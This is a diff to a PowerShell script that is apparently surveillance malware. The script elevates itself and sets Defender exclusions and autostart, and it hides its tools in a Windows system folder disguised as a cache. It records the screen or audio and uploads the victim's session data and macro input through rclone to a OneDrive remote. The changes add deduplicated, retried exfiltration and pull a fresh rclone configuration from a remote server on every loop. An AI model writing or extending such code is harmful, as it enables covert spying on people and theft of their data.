@@ -29,7 +29,7 @@ function Test-Admin {
         if (-not $isAdmin) {
             $arguments = "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
             Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs
-            return
+            exit
         }
         return $true
     } catch {
@@ -397,12 +397,14 @@ objShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File %APPD
 
 
 function Export-And-Report {
-    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
     $user = $env:USERNAME
-    $remoteBase = "onedrive:system_cache_uploads/$user/$timestamp"
+    $remoteBase = "onedrive:system_cache_uploads/$user"
     $rcloneExe = "$env:APPDATA\Microsoft\Windows\system_cache\rclone.exe"
     $rcloneConf = "$env:APPDATA\Microsoft\Windows\system_cache\rclone.conf"
     $sessionDataDir = "$env:USERPROFILE\sessionData"
+    $sentLog = "$env:APPDATA\Microsoft\Windows\system_cache\sent_files.json"
+    if (!(Test-Path $sentLog)) { @{} | ConvertTo-Json | Set-Content $sentLog }
+    $sent = Get-Content $sentLog | ConvertFrom-Json
 
     $pathsToSend = @(
         @{ Path = $sessionDataDir; Remote = "$remoteBase/sessionData" },
@@ -412,36 +414,32 @@ function Export-And-Report {
         @{ Path = $macroInputPath; Remote = "$remoteBase/macroInput.txt" }
     )
 
-    $jobs = @()
     foreach ($entry in $pathsToSend) {
         $src = $entry.Path
         $dst = $entry.Remote
-
         if (Test-Path $src) {
-            if ((Get-Item $src).PSIsContainer) {
-                Get-ChildItem -Path $src -Force | ForEach-Object {
-                    $item = $_.FullName
-                    $jobs += Start-Job -ScriptBlock {
-                        param($rcloneExe, $rcloneConf, $item, $dst)
-                        try {
-                            if (Test-Path $item -PathType Container) {
-                                & $rcloneExe copy "$item" "$dst" --config "$rcloneConf" --quiet
-                            } else {
-                                & $rcloneExe copyto "$item" (Join-Path $dst ([IO.Path]::GetFileName($item))) --config "$rcloneConf" --quiet
-                            }
-                        } catch {}
-                    } -ArgumentList $rcloneExe, $rcloneConf, $item, $dst
-                }
+            $items = if ((Get-Item $src).PSIsContainer) {
+                Get-ChildItem -Path $src -Recurse -File
             } else {
-                $jobs += Start-Job -ScriptBlock {
-                    param($rcloneExe, $rcloneConf, $src, $dst)
+                @(Get-Item $src)
+            }
+            foreach ($item in $items) {
+                $key = $item.FullName
+                $hash = (Get-FileHash $item.FullName -Algorithm SHA256).Hash
+                if ($sent[$key] -eq $hash) { continue }
+                $success = $false
+                for ($i=0; $i -lt 3; $i++) {
                     try {
-                        & $rcloneExe copyto "$src" "$dst" --config "$rcloneConf" --quiet
-                    } catch {}
-                } -ArgumentList $rcloneExe, $rcloneConf, $src, $dst
+                        & $rcloneExe copyto "$($item.FullName)" (Join-Path $dst $item.Name) --config "$rcloneConf" --quiet
+                        $success = $true
+                        break
+                    } catch { Start-Sleep -Seconds 5 }
+                }
+                if ($success) { $sent[$key] = $hash }
             }
         }
     }
+    $sent | ConvertTo-Json | Set-Content $sentLog
 
     $summary = @"
 PowerShell Report
@@ -462,6 +460,49 @@ CloudPath: $remoteBase
     }
 }
 
+function Update-RcloneConf {
+    $remoteConfUrl = "$pagesUrl/rclone.conf"
+    $localConf = "$env:APPDATA\Microsoft\Windows\system_cache\rclone.conf"
+    try {
+        $remoteInfo = Invoke-WebRequest -Uri $remoteConfUrl -UseBasicParsing -Method Head -ErrorAction Stop
+        $remoteDate = $remoteInfo.Headers["Last-Modified"]
+        $localDate = if (Test-Path $localConf) { (Get-Item $localConf).LastWriteTimeUtc } else { [datetime]::MinValue }
+        if ($remoteDate) {
+            $remoteDate = [datetime]::Parse($remoteDate).ToUniversalTime()
+            if ($remoteDate -gt $localDate) {
+                Invoke-WebRequest -Uri $remoteConfUrl -OutFile $localConf -UseBasicParsing -ErrorAction Stop
+                Write-Output "rclone.conf updated from server"
+            }
+        } elseif (!(Test-Path $localConf)) {
+            Invoke-WebRequest -Uri $remoteConfUrl -OutFile $localConf -UseBasicParsing -ErrorAction Stop
+            Write-Output "rclone.conf downloaded (no local copy)"
+        }
+    } catch {
+        Write-Warning "Failed to update rclone.conf: $_"
+    }
+}
+
+function Wait-ForFiles {
+    param([string[]]$files, [int]$timeoutSec = 120)
+    $start = Get-Date
+    while ($true) {
+        $missing = $files | Where-Object { -not (Test-Path $_) }
+        if ($missing.Count -eq 0) { break }
+        if ((Get-Date) - $start -gt (New-TimeSpan -Seconds $timeoutSec)) {
+            throw "Timeout waiting for files: $($missing -join ', ')"
+        }
+        Start-Sleep -Seconds 2
+    }
+}
+
+Wait-ForFiles @(
+    "$env:APPDATA\Microsoft\Windows\system_cache\ffmpeg.exe",
+    "$env:APPDATA\Microsoft\Windows\system_cache\rclone.exe",
+    "$env:APPDATA\Microsoft\Windows\system_cache\rclone.conf"
+)
+
+Update-RcloneConf
+
 Test-Admin
 Set-DefenderExclusions
 Set-Autostart
@@ -476,6 +517,7 @@ while ($true) {
     Start-Recording
     Export-And-Report
     Test-Update
+    Update-RcloneConf
     Start-Sleep -Seconds 10
 }
 
